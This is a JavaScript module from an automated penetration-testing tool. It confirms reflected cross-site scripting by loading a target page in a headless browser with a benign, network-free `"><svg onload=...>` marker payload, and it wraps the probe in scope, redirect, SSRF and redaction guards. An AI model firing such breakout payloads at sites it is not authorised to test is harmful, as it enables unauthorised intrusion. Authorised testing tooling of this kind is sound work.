"use strict";

// bob_http_xss_confirm — the browser-EXECUTION reflected-XSS *confirm* signed-row
// PRODUCER. This is the FIRST HIGH-ceiling signed producer: it proves a reflected
// injection actually EXECUTES as script in a real browser engine, lifting a
// reflected-XSS finding from reflection-context survival (the MEDIUM that
// bob_http_xss_reflect proves) to proven script execution (HIGH).
//
// THE ORACLE (sound, deterministic, re-producible — NOT the #110 noise trap):
// server-mint a high-entropy nonce, then drive Bob's OWN headless browser through
// two GET navigations against ONE recorded query param of the routed surface:
//   • CONTROL — the param value is the inert nonce TEXT (no metacharacters). After
//     navigation a read-only `evaluate` confirms the nonce-keyed window marker is
//     ABSENT (rules out a page-default marker).
//   • PROBE — the param value is a BENIGN, NETWORK-FREE executing payload
//     (`"><svg onload=…>`) whose ONLY effect, IF it runs, is to set that same
//     nonce-keyed window global to the nonce string. After navigation the same
//     read-only `evaluate` reads the marker back.
// The witness is a deterministic DIFFERENTIAL: marker ABSENT on the control page
// AND marker === the server-minted nonce on the probe page ⟹ the injected script
// executed. Because the marker key carries 128 bits of producer-minted entropy and
// the control proves absence, a TRUE positive cannot arise from server noise or a
// page default — categorically unlike the synthetic-non-existent-id confirmer
// (#110), which had no sound positive. Re-navigating reproduces the witness across
// the 3 blind verification rounds. EVERY other outcome (marker absent on the probe
// → escaped / encoded / sanitized / non-executable context / CSP-blocked, WAF, a
// navigation error, no browser) fails CLOSED and signs NOTHING.
//
// ARCHITECTURE (honest): unlike the pure-safeFetch reflect finder, this producer
// drives the established bob_browser_* subsystem, which is SUBPROCESS-backed
// (browser-sessions.js spawns mcp/browser-driver.js). That is the accepted,
// reviewed way every browser tool runs; this module therefore does NOT carry the
// reflect producer's "never require child_process" purity invariant. Its purity
// guarantees are the SAME ones reflect makes at the request layer: no
// agent-controlled URL / param name / value / nonce / payload (assertNoForbiddenInputs
// + a server-minted nonce), GET-only, scope- + read-only-revalidated URLs, and a
// fail-closed differential. The injected URL is scope-checked twice — synchronously
// here before any browser spawn (first-party host + read-only), and again by the
// driver's own navigate guard (mcp/browser-driver.js). NOTE: with block_internal_hosts
// OFF (the only mode this producer runs — it refuses when ON), the driver's recheck is
// a host-string scope check, NOT a DNS / internal-IP resolution; that resolution is the
// documented SSRF residual on the browser path. The producer strips the endpoint
// fragment, and re-checks each navigation's final_url stays on the recorded endpoint
// (fail closed on any redirect to a different origin OR path) so a signed HIGH is never
// attributed to a page the script did not run on. Pre-emptive redirect interception
// (the browser already issued the redirected hop) is a shared browser-driver change
// deferred to the browser-hardening / offensive-sandbox PR.
//
// INTEGRITY BOUNDARY (honest, NOT closed here): this is the FIRST tool that signs a
// HIGH offensive-runs row, so the #108 in-process-key boundary is now load-bearing
// at HIGH. The row MAC is TAMPER-EVIDENT against an agent confined to the MCP +
// guarded-Bash surface; it is NOT cryptographically un-forgeable — a same-UID actor
// running arbitrary in-process code (a `node -e` that reads the 0600 signing key and
// hand-MACs a row) can forge a row around every gate below, the SAME assumption
// Bob's wave-handoff signing makes. A HIGH ceiling RAISES the blast radius of that
// residual from a fabricated MEDIUM (reflect) to a fabricated HIGH. Absolute
// un-fakeability requires the deferred offensive-SANDBOX (UID/container) PR; do NOT
// advertise un-fakeability. The second handler parameter ({ driver }) — the seam
// tests use to drive the oracle without a live browser — is WITHIN this same
// in-process boundary (a caller that can pass it can already read the key and forge
// a row directly), so it does not widen the trust boundary. The MCP dispatcher
// always calls confirmXssExecution(args) with NO second argument (LIVE).
//
// EGRESS / SSRF RESIDUAL (honest): the browser driver navigates with
// blockInternalHosts:false (it cannot enforce the session SSRF policy), so this
// producer REFUSES to run when block_internal_hosts is on — failing closed rather
// than confirming through a channel that cannot honor the policy. With the policy
// off it threads the session's resolved egress profile into Patchright's proxy.

const {
  ERROR_CODES,
  ToolError,
} = require("./envelope.js");
const {
  readSessionStateStrict,
} = require("./session-state-store.js");
const {
  blockInternalHostsPolicyFields,
} = require("./session-state-contracts.js");
const {
  resolveAndAssertSessionEgressIdentity,
} = require("./session-state.js");
const {
  assertSafeRequestUrl,
} = require("./safe-fetch.js");
const {
  assertEnumValue,
  assertNonEmptyString,
  assertRequiredText,
} = require("./validation.js");
const {
  findRoutedSurface,
  resolveQueryLocusEndpoint,
  recordedQueryParamNames,
  assertReadOnlyPath,
  auditConfirmRequest,
  assertNoForbiddenInputs,
  sensitiveShapesPresent,
  mintSensitiveShapeSafeToken,
  SCOPE_VALIDATION_OPTS,
} = require("./offensive-http-common.js");
const {
  canonicalizeExploitTarget,
} = require("./claims.js");
const {
  buildAndSignOffensiveRow,
} = require("./offensive-capture-writer.js");
const {
  withSessionLock,
} = require("./storage.js");
const {
  canonicalJson,
} = require("./verification-contracts.js");
const {
  browserSessions,
  callBrowser,
  assertExpressionSandbox,
  parseProxyUrlForPlaywright,
} = require("./browser-tools-shared.js");

const TOOL_ID = "bob_http_xss_confirm";
// GET-only by construction (idempotent, read-only-safe, re-producible). The tool
// accepts NO method input — the inputSchema is additionalProperties:false with no
// `method` property — so the HTTP method is fixed here rather than read from args
// (a `normalizeMethod(args.method)` would be a ghost input the schema rejects).
// POST/form execution is a deferred oracle_kind.
const HTTP_METHOD = "GET";
const ORACLE_KIND_VALUES = Object.freeze(["script_execution"]);
// param_locus is a non-negative ordinal selecting among the surface's recorded
// query params; bound it so a wild value cannot index unboundedly.
const MAX_PARAM_LOCUS = 256;
// Per-navigation timeout handed to the driver; the driver's own COMMAND_TIMEOUT_MS
// (90s) is the hard ceiling, this is the soft page-load budget.
const NAV_TIMEOUT_MS = 15_000;
// WAF / rate-limit statuses: not a rendered execution sink — fail closed.
const WAF_STATUSES = Object.freeze(new Set([429, 503]));

// HARD HIGH by construction: proven script EXECUTION (not mere reflection). Frozen
// + "use strict" means an in-process actor's `MAP.x = "critical"` THROWS.
// demonstrated_severity is stamped from the registry in buildAndSignOffensiveRow
// (OFFENSIVE_TOOL_DEMONSTRATED_CEILING), NEVER from here and NEVER agent-supplied;
// this frozen map documents the intent + anchors a test.
const XSS_EXEC_DEMONSTRATED_CEILING = Object.freeze({ script_execution: "high" });

// ── small helpers ──────────────────────────────────────────────────────────

function rejectInvalidArguments(message, details = null) {
  throw new ToolError(ERROR_CODES.INVALID_ARGUMENTS, message, details);
}

function normalizeOracleKind(value) {
  return assertEnumValue(assertRequiredText(value, "oracle_kind"), ORACLE_KIND_VALUES, "oracle_kind");
}

// param_locus is a SELECTOR ordinal (a non-negative integer as a string), NEVER a
// raw param name/value/URL. It picks WHICH of the surface's deterministically
// sorted recorded query params to test; the param NAME is server-derived from the
// surface record and the injected VALUE is server-minted.
function normalizeParamLocus(value) {
  const raw = assertRequiredText(value, "param_locus").trim();
  if (!/^\d+$/.test(raw)) {
    rejectInvalidArguments("param_locus must be a non-negative integer ordinal selecting a recorded query param (never a raw URL, param name, or value)");
  }
  const index = Number(raw);
  if (!Number.isInteger(index) || index < 0 || index > MAX_PARAM_LOCUS) {
    rejectInvalidArguments(`param_locus ordinal must be between 0 and ${MAX_PARAM_LOCUS}`);
  }
  return index;
}

function isWafStatus(nav) {
  return !!(nav && typeof nav.status === "number" && WAF_STATUSES.has(nav.status));
}

// page.goto follows server redirects, so the page the marker is observed on may differ
// from the requested URL. Validate the LANDED url exactly as the requested url was
// validated upfront — the same scope (assertSafeRequestUrl) + read-only (assertReadOnlyPath)
// guards, pinned to the recorded endpoint's origin+pathname, and no fragment — and fail
// closed on ANY drift. This catches an off-origin redirect, a same-origin redirect to a
// different path (/search -> /logout), AND a same-path redirect that adds a
// mutation-shaped query or fragment (?_method=DELETE, #/settings/delete) the upfront
// guard never saw. A missing final_url means no redirect was observed; an unparseable
// one fails closed. NOTE: this is a POST-navigation refusal — it stops the tool from
// reading the marker or SIGNING on a redirect, but the browser driver has already issued
// the redirected hop; pre-emptive redirect interception is a shared browser-driver
// change deferred to the browser-hardening / offensive-sandbox PR (mitigated here:
// block_internal_hosts ON refuses the run, the requested URL is server-derived +
// scope-validated, and no signed positive can be forged across a payload-dropping redirect).
function finalNavUnsafe(nav, baseUrl, domain) {
  const finalUrl = nav && typeof nav.final_url === "string" ? nav.final_url : null;
  if (!finalUrl) return false;
  let f;
  try {
    f = new URL(finalUrl);
  } catch {
    return true;
  }
  if (f.hash) return true;
  if (f.origin !== baseUrl.origin || f.pathname !== baseUrl.pathname) return true;
  try {
    assertSafeRequestUrl(finalUrl, domain, SCOPE_VALIDATION_OPTS);
    assertReadOnlyPath(finalUrl, TOOL_ID);
  } catch {
    return true;
  }
  return false;
}

// A browser/Playwright error message commonly embeds the full navigated URL, which
// preserves the surface's non-locus recorded query params (token=, session=) AND its
// path (which may carry a reset token / PII segment). This tool is sensitive_output:true
// and the error also flows into the http-audit record, so strip every embedded http(s)
// URL down to its ORIGIN only (drop path/query/fragment/userinfo), cap the length, and —
// as a backstop for any known PII/secret shape surviving in the free text — fall back to
// a generic reason.
function redactedBrowserFailure(error) {
  const raw = error && error.message ? String(error.message) : String(error);
  const stripped = raw.replace(/https?:\/\/[^\s"'<>]+/gi, (u) => {
    try { return new URL(u).origin; } catch { return "[url]"; }
  }).slice(0, 300);
  if (sensitiveShapesPresent(stripped)) return "browser navigation error (redacted)";
  return stripped;
}

// The LIVE browser driver. confirmXssExecution accepts an injectable `driver` so
// seeded tests need no Chromium; with no driver the MCP dispatcher binds this one.
// callBrowser(command, sessionId, args) reorders to sendCommand(sessionId, command,
// args); these wrappers keep the producer free of that footgun. Each call returns
// the driver's RAW result ({status, final_url} for navigate, {result} for evaluate)
// and REJECTS with an Error (.code) on driver error.
const liveBrowserDriver = Object.freeze({
  isAvailable: () => browserSessions.isPatchrightAvailable(),
  start: (opts) => browserSessions.startSession(opts),
  navigate: (sessionId, url, timeoutMs) => callBrowser("navigate", sessionId, { url, timeout_ms: timeoutMs }),
  evaluate: (sessionId, expression) => callBrowser("evaluate", sessionId, { expression }),
  close: (sessionId, reason) => browserSessions.closeSession(sessionId, reason),
});

function blocked(outcome, reason, extra = {}) {
  return {
    confirmed: false,
    target_domain: null,
    tool_id: TOOL_ID,
    offensive_outcome: outcome,
    reason,
    row_written: false,
    ...extra,
  };
}

// Drive ONE navigation and audit it so the circuit breaker / request budget count
// the live traffic (the driver also re-checks the URL host against scope). A
// swallowed audit-write aborts the run closed — this producer signs a durable
// proof row, so it must not fire un-audited live navigations.
async function navigateAndAudit(drv, {
  sessionId, url, domain, surfaceId, egressProfile, startedAt,
}) {
  let nav;
  let error;
  let scopeBlocked = false;
  try {
    nav = await drv.navigate(sessionId, url, NAV_TIMEOUT_MS);
  } catch (e) {
    error = e;
    if (e && (e.scope_decision === "blocked" || e.code === "scope_blocked")) scopeBlocked = true;
  }
  const auditOk = auditConfirmRequest({
    domain,
    surfaceId,
    method: "GET",
    url,
    egressProfile,
    status: nav ? nav.status : null,
    scopeDecision: scopeBlocked ? "blocked" : null,
    // Redact before it reaches http-audit.jsonl: normalizeHttpAuditRecord redacts the
    // url field but NOT error, and bob_read_http_audit returns error to agents — a raw
    // Playwright error embeds the full URL (with recorded token=/session= params).
    error: error ? redactedBrowserFailure(error) : null,
    startedAt,
    toolId: TOOL_ID,
  });
  if (auditOk === false) {
    const auditErr = new ToolError(ERROR_CODES.STATE_CONFLICT, "navigation http-audit write failed");
    auditErr.probe_audit_failed = true;
    throw auditErr;
  }
  if (error) throw error;
  return nav;
}

// Read the nonce-keyed marker back via a read-only `evaluate`. The expression is a
// pure property read (no fetch/XHR/socket/navigation-write), so it passes the
// driver's evaluate sandbox; assertExpressionSandbox fails fast at the wrapper too.
async function readMarker(drv, sessionId, markerKey) {
  const expression = assertExpressionSandbox(`window[${JSON.stringify(markerKey)}] ?? null`);
  const res = await drv.evaluate(sessionId, expression);
  return res && Object.prototype.hasOwnProperty.call(res, "result") ? res.result : null;
}

// The full oracle. `driver` is injectable so seeded tests need no live browser;
// with no driver the MCP dispatcher drives the LIVE arm via Patchright.
async function confirmXssExecution(args = {}, { driver = null } = {}) {
  // The request is server-derived. Reject the base forbidden set PLUS every raw
  // locus-/payload-smuggling field — a caller may supply ONLY the ordinal
  // param_locus, never a raw URL, param name, value, nonce, sentinel, or payload.
  assertNoForbiddenInputs(args, TOOL_ID, [
    "param", "param_name", "param_value", "value", "locus", "locus_url", "injection",
    "canary", "nonce", "sentinel", "payload", "marker", "expression", "session_id",
  ]);

  const drv = driver || liveBrowserDriver;
  const startedAt = Date.now();
  const domain = assertNonEmptyString(args.target_domain, "target_domain");
  const surfaceId = assertNonEmptyString(args.surface_id, "surface_id");
  const oracleKind = normalizeOracleKind(args.oracle_kind);
  const method = HTTP_METHOD;
  const paramLocus = normalizeParamLocus(args.param_locus);

  const { state } = readSessionStateStrict(domain);
  const internalHostPolicy = blockInternalHostsPolicyFields(state);
  const blockInternalHosts = internalHostPolicy.block_internal_hosts === true;

  const fail = (outcome, reason) => blocked(outcome, reason, {
    target_domain: domain,
    surface_id: surfaceId,
    oracle_kind: oracleKind,
    ...internalHostPolicy,
  });

  // The headless browser driver navigates with blockInternalHosts:false and cannot
  // enforce the session SSRF policy. Rather than confirm through a channel that
  // cannot honor block_internal_hosts, refuse to run when it is on (fail closed).
  if (blockInternalHosts) {
    return fail("blocked_by_design", "block_internal_hosts_unsupported_for_browser");
  }

  // Resolve + route the surface, then derive the injection locus SERVER-SIDE from
  // a recorded query param (never an agent-supplied URL/name).
  const { surface } = findRoutedSurface(domain, surfaceId);
  const locusEndpoints = resolveQueryLocusEndpoint(domain, surface, state, TOOL_ID);
  if (locusEndpoints.length === 0) {
    return fail("blocked_by_design", "no_recorded_query_param");
  }
  if (locusEndpoints.length > 1) {
    return fail("blocked_by_design", "ambiguous_query_endpoint");
  }
  const baseUrl = locusEndpoints[0];
  // Strip any fragment: it is never sent to the server, and the read-only guard only
  // inspects path+query — a recorded SPA fragment (#/logout, #/settings/delete) could
  // otherwise drive a client-side mutation route in the browser. Both the control and
  // probe URLs are built from baseUrl, so clearing it here clears it on both.
  baseUrl.hash = "";
  assertReadOnlyPath(baseUrl.toString(), TOOL_ID);

  const paramNames = recordedQueryParamNames(baseUrl);
  if (paramLocus >= paramNames.length) {
    rejectInvalidArguments(
      `param_locus ordinal ${paramLocus} is out of range; the routed surface records ${paramNames.length} query param(s)`,
      { code: "xss_confirm_param_locus_out_of_range", recorded_param_count: paramNames.length },
    );
  }
  const paramName = paramNames[paramLocus];

  // Egress identity (mirrors the reflect finder); convert the resolved proxy_url
  // into Patchright's structured proxy form for the session.
  const requestedEgressProfile = typeof state.egress_profile === "string" && state.egress_profile.trim()
    ? state.egress_profile
    : "default";
  const { profile: egressProfile, identity } = resolveAndAssertSessionEgressIdentity(domain, requestedEgressProfile, {
    source: TOOL_ID,
  });
  let playwrightProxy = null;
  if (egressProfile && egressProfile.proxy_url) {
    try {
      playwrightProxy = parseProxyUrlForPlaywright(egressProfile.proxy_url);
    } catch (e) {
      return fail("blocked_by_infra", "egress_unsupported_for_browser");
    }
  }
  const egressProfileName = identity.egress_profile || requestedEgressProfile;

  // Server-mint the nonce + key the benign executing marker to it. The CONTROL
  // value is inert text (reflects without executing); the PROBE value is the
  // network-free svg-onload payload that sets ONLY window[markerKey] = nonce IFF
  // it executes. `"><svg onload=…>` breaks out of text-node / double-quoted-attr /
  // unquoted-attr contexts (single-quoted-attr is a documented v1 miss).
  const nonce = mintSensitiveShapeSafeToken("bxe");
  const markerKey = `__bobxe_${nonce}`;
  const controlValue = nonce;
  const probeValue = `"><svg onload="window.${markerKey}='${nonce}'">`;

  // Build the CONTROL + PROBE URLs by replacing ONLY the locus param's value;
  // every other recorded param keeps its recorded value.
  const controlUrl = new URL(baseUrl.toString());
  controlUrl.searchParams.set(paramName, controlValue);
  const probeUrl = new URL(baseUrl.toString());
  probeUrl.searchParams.set(paramName, probeValue);

  // Re-validate the FINAL injected URLs (path + query) synchronously BEFORE any
  // browser spawn, and re-assert the origin. The driver re-checks the host against
  // scope at navigate time; this upfront pass is the fail-fast + read-only guard
  // the driver omits.
  for (const u of [controlUrl, probeUrl]) {
    assertSafeRequestUrl(u.toString(), domain, SCOPE_VALIDATION_OPTS);
    assertReadOnlyPath(u.toString(), TOOL_ID);
    if (u.origin !== baseUrl.origin) {
      rejectInvalidArguments("injected probe URL must resolve under the recorded surface endpoint origin");
    }
  }

  // Screen the value-blind proof target for PII / secret shapes BEFORE any live
  // navigation. A recorded PATH segment (/u/alice@corp.com, /reset/<token>) must never
  // reach a live audited request: navigateAndAudit writes the URL into http-audit.jsonl,
  // so this screen has to run first, not only on the post-execution success path.
  // canonicalizeExploitTarget strips the query to origin+path.
  const canonicalTarget = canonicalizeExploitTarget(probeUrl.toString());
  if (sensitiveShapesPresent(canonicalTarget)) {
    return fail("blocked_operator_pii", "proof_target_contains_sensitive_value");
  }

  if (!drv.isAvailable()) {
    return fail("blocked_by_infra", "browser_unavailable");
  }

  let sessionId = null;
  try {
    const started = await drv.start({
      targetDomain: domain,
      targetUrl: baseUrl.toString(),
      headless: true,
      proxy: playwrightProxy,
    });
    sessionId = started && started.session_id ? started.session_id : null;
    if (!sessionId) {
      return fail("blocked_by_infra", "browser_session_start_failed");
    }

    const auditBase = { domain, surfaceId, egressProfile: egressProfileName, startedAt };

    // CONTROL: inert nonce text — the marker must be ABSENT.
    const controlNav = await navigateAndAudit(drv, { ...auditBase, sessionId, url: controlUrl.toString() });
    if (isWafStatus(controlNav)) {
      return fail("blocked_by_defense", "waf_or_rate_limit");
    }
    if (finalNavUnsafe(controlNav, baseUrl, domain)) {
      return fail("blocked_by_defense", "redirect_off_surface");
    }
    const controlMarker = await readMarker(drv, sessionId, markerKey);
    if (controlMarker !== null) {
      // The marker is present WITHOUT our executing payload → not a clean witness.
      return fail("blocked_by_infra", "control_marker_present");
    }

    // PROBE: the benign executing payload — the marker must equal the nonce.
    const probeNav = await navigateAndAudit(drv, { ...auditBase, sessionId, url: probeUrl.toString() });
    if (isWafStatus(probeNav)) {
      return fail("blocked_by_defense", "waf_or_rate_limit");
    }
    if (finalNavUnsafe(probeNav, baseUrl, domain)) {
      return fail("blocked_by_defense", "redirect_off_surface");
    }
    const probeMarker = await readMarker(drv, sessionId, markerKey);
    if (probeMarker !== nonce) {
      // Escaped / encoded / sanitized / non-executable context / CSP-blocked.
      return fail("blocked_by_defense", "script_did_not_execute");
    }

    // ── build the canonical proof (canonicalTarget was value-blind PII-screened
    // before navigation; the capture below carries ONLY the nonce-keyed observation) ──
    // The capture carries ONLY the nonce-keyed observation — NEVER page bytes.
    const stdoutContent = canonicalJson({
      param: paramName,
      oracle: "script_execution",
      marker_observed: true,
    });
    const stderrContent = canonicalJson({
      control_status: controlNav ? controlNav.status : null,
      probe_status: probeNav ? probeNav.status : null,
      param: paramName,
      control_marker_absent: true,
      probe_marker_executed: true,
    });
    if (sensitiveShapesPresent(stdoutContent) || sensitiveShapesPresent(stderrContent)) {
      return fail("blocked_operator_pii", "capture_contains_sensitive_value");
    }

    const relationBooleans = {
      control_marker_absent: true,
      probe_marker_executed: true,
      script_execution_observed: true,
    };

    // demonstrated_severity is DERIVED from the per-tool registry inside
    // buildAndSignOffensiveRow (never passed from here). Capture FIRST, recompute
    // hashes from on-disk bytes, sign LAST, hardened append — under the session
    // lock (the run_id single-use guard is only race-safe there).
    const row = withSessionLock(domain, () => buildAndSignOffensiveRow(domain, {
      runIdPrefix: "xssexec",
      toolId: TOOL_ID,
      method,
      canonicalTarget,
      surfaceId,
      identityTag: "unauth-xss-exec",
      stdoutContent,
      stderrContent,
      relationBooleans,
    }));

    // Masked oracle return (sensitive_output:true) — booleans + hashes + run_id,
    // NEVER raw response bytes.
    return {
      confirmed: true,
      target_domain: domain,
      surface_id: surfaceId,
      oracle_kind: oracleKind,
      offensive_outcome: "exploited_safely",
      row_written: true,
      run_id: row.run_id,
      tool_id: row.tool_id,
      target: row.target,
      command_hash: row.command_hash,
      stdout_hash: row.stdout_hash,
      stderr_hash: row.stderr_hash,
      exit_code: row.exit_code,
      demonstrated_severity: row.demonstrated_severity,
      masked_oracle: {
        param: paramName,
        oracle: "script_execution",
        relation: relationBooleans,
        observation_hash: row.stdout_hash,
      },
      ...identity,
      ...internalHostPolicy,
    };
  } catch (error) {
    if (error && error.probe_audit_failed) {
      return fail("blocked_by_infra", "probe_audit_failed");
    }
    return blocked("blocked_by_infra", "browser_error", {
      target_domain: domain,
      surface_id: surfaceId,
      oracle_kind: oracleKind,
      failure_reason: redactedBrowserFailure(error),
      ...internalHostPolicy,
    });
  } finally {
    if (sessionId) {
      try {
        await drv.close(sessionId, "xss_confirm_complete");
      } catch {
        // ignore — the session may already be closed/reaped
      }
    }
  }
}

module.exports = {
  TOOL_ID,
  ORACLE_KIND_VALUES,
  XSS_EXEC_DEMONSTRATED_CEILING,
  confirmXssExecution,
  // Exported for unit tests (seeded driver, no live browser).
  liveBrowserDriver,
  // NOTE: buildAndSignOffensiveRow (offensive-capture-writer.js) is intentionally
  // NOT re-exported — it signs+writes a row WITHOUT running the oracle gates above,
  // so re-exporting it would give an internal caller a gate-bypassing signed-row
  // path. Tests drive the full oracle through confirmXssExecution.
};
